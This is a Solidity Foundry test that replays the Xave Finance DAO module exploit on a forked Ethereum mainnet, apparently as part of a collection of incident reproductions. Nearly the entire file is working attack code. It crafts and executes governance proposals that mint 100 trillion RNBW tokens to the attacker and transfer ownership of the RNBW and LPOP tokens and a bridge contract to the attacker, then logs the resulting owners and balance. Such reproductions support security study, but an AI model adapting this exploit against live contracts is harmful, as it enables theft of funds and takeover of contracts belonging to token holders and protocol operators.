// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 100,000,000,000,000 RNBW
// Attacker : 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2
// Attack Contract : 0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3
// Vulnerable Contract : https://etherscan.io/address/0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F
// Attack Tx : https://etherscan.io/tx/0xc18ec2eb7d41638d9982281e766945d0428aaeda6211b4ccb6626ea7cff31f4a

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F#code

// @Analysis
// Article post mortem Xave Finance : https://medium.com/xave-finance/post-mortem-safenap-dao-module-bug-505958e9c716
// Article Andrei Simion : https://gist.github.com/andreiashu/da5909a7230ff67a8c3b4018a9717276
// Twitter BeosinAlert : https://twitter.com/BeosinAlert/status/1579040051853303808
// Twitter Ancilia : https://twitter.com/AnciliaInc/status/1578952542926491650

contract Enum {
    enum Operation {
        Call,
        DelegateCall
    }
}

interface IDaoModule {
    function getTransactionHash(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 nonce
    ) external view returns (bytes32);

    function executeProposalWithIndex(
        string memory proposalId,
        bytes32[] memory txHashes,
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 txIndex
    ) external;

    function addProposal(string memory proposalId, bytes32[] memory txHashes) external;

    function buildQuestion(string memory proposalId, bytes32[] memory txHashes) external pure returns (string memory);

    function questionIds(bytes32) external returns (bytes32);
}

interface IRealitio {
    function submitAnswer(bytes32 question_id, bytes32 answer, uint256 max_previous) external payable;
}

interface IPrimaryBridge {
    function owner() external view returns (address);
}

contract XaveFinanceExploit is Test {
    IERC20 constant RNBW_TOKEN = IERC20(0xE94B97b6b43639E238c851A7e693F50033EfD75C);
    IERC20 constant LPOP_TOKEN = IERC20(0x6335A2E4a2E304401fcA4Fc0deafF066B813D055);
    IPrimaryBridge constant PRIMARY_BRIDGE = IPrimaryBridge(0x579270F151D142eb8BdC081043a983307Aa15786);
    IDaoModule constant DAO_MODULE = IDaoModule(0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F);
    IRealitio constant REALITIO = IRealitio(0x325a2e0F3CCA2ddbaeBB4DfC38Df8D19ca165b47);
    address constant ATTACKER_EOA = 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2;
    address constant ATTACKER_CONTRACT = 0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_704_736);
        // Adding labels to improve stack traces' readability
        vm.label(address(RNBW_TOKEN), "RNBW_TOKEN");
        vm.label(address(LPOP_TOKEN), "LPOP_TOKEN");
        vm.label(address(PRIMARY_BRIDGE), "PRIMARY_BRIDGE");
        vm.label(address(DAO_MODULE), "DAO_MODULE");
        vm.label(address(REALITIO), "REALITIO");
        vm.label(ATTACKER_EOA, "ATTACKER_EOA");
        vm.label(ATTACKER_CONTRACT, "ATTACKER_CONTRACT");
        vm.label(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E, "XAVE_GNOSIS_SAFE_MULTISIG");
    }

    function encodeWithSignature_mint(address to, uint256 amount) internal pure returns (bytes memory) {
        return abi.encodeWithSignature("mint(address,uint256)", to, amount);
    }

    function encodeWithSignature_transferOwnership(address to) internal pure returns (bytes memory) {
        return abi.encodeWithSignature("transferOwnership(address)", to);
    }

    function testAttack() public {
        // tx to mint 100,000,000,000,000 RNBW tokens
        bytes32 tx0 = DAO_MODULE.getTransactionHash(
            address(RNBW_TOKEN),
            0,
            encodeWithSignature_mint(ATTACKER_EOA, 100_000_000_000_000_000_000_000_000_000_000),
            //hex"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000",
            Enum.Operation(0),
            0
        );

        // tx to transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        bytes32 tx1 = DAO_MODULE.getTransactionHash(
            address(RNBW_TOKEN),
            0,
            encodeWithSignature_transferOwnership(ATTACKER_EOA),
            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            1
        );

        // tx to transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        bytes32 tx2 = DAO_MODULE.getTransactionHash(
            address(LPOP_TOKEN),
            0,
            encodeWithSignature_transferOwnership(ATTACKER_EOA),
            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            2
        );

        // tx to transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        bytes32 tx3 = DAO_MODULE.getTransactionHash(
            address(PRIMARY_BRIDGE),
            0,
            encodeWithSignature_transferOwnership(ATTACKER_EOA),
            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            3
        );

        // the txIDs generated using getTransactionHash()
        bytes32[] memory txIDs = new bytes32[](4);
        txIDs[0] = tx0;
        txIDs[1] = tx1;
        txIDs[2] = tx2;
        txIDs[3] = tx3;

        DAO_MODULE.addProposal("2", txIDs);
        string memory q = DAO_MODULE.buildQuestion("2", txIDs);
        bytes32 qID = DAO_MODULE.questionIds(keccak256(bytes(q)));
        REALITIO.submitAnswer{value: 1}(qID, bytes32(uint256(1)), 0);

        vm.warp(block.timestamp + 24 * 60 * 60);

        emit log_named_address("[Before proposal Execution] Owner of $RNBW: ", RNBW_TOKEN.owner());
        emit log_named_address("[Before proposal Execution] Owner of $LPOP: ", LPOP_TOKEN.owner());
        emit log_named_address("[Before proposal Execution] Owner of PrimaryBridge: ", PRIMARY_BRIDGE.owner());
        emit log_named_decimal_uint(
            "[Before proposal Execution] Attacker's $RNBW Token Balance: ", RNBW_TOKEN.balanceOf(ATTACKER_EOA), 18
        );

        vm.startPrank(ATTACKER_CONTRACT);

        // Execute mint 100,000,000,000,000 RNBW tokens
        DAO_MODULE.executeProposalWithIndex(
            "2",
            txIDs,
            address(RNBW_TOKEN),
            0,
            encodeWithSignature_mint(ATTACKER_EOA, 100_000_000_000_000_000_000_000_000_000_000),
            //hex"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000",
            Enum.Operation(0),
            0
        );

        // Execute transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        DAO_MODULE.executeProposalWithIndex(
            "2",
            txIDs,
            address(RNBW_TOKEN),
            0,
            encodeWithSignature_transferOwnership(ATTACKER_EOA),
            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            1
        );

        // Execute transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        DAO_MODULE.executeProposalWithIndex(
            "2",
            txIDs,
            address(LPOP_TOKEN),
            0,
            encodeWithSignature_transferOwnership(ATTACKER_EOA),
            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            2
        );

        // Execute transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)
        DAO_MODULE.executeProposalWithIndex(
            "2",
            txIDs,
            address(PRIMARY_BRIDGE),
            0,
            encodeWithSignature_transferOwnership(ATTACKER_EOA),
            //hex"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2",
            Enum.Operation(0),
            3
        );

        vm.stopPrank();

        emit log_string("--------------------------------------------------------------");
        emit log_named_address("[After proposal Execution] Owner of $RNBW: ", RNBW_TOKEN.owner());
        emit log_named_address("[After proposal Execution] Owner of $LPOP: ", LPOP_TOKEN.owner());
        emit log_named_address("[After proposal Execution] Owner of PrimaryBridge: ", PRIMARY_BRIDGE.owner());
        emit log_named_decimal_uint(
            "[After proposal Execution] Attacker's $RNBW Token Balance: ", RNBW_TOKEN.balanceOf(ATTACKER_EOA), 18
        );
    }
}
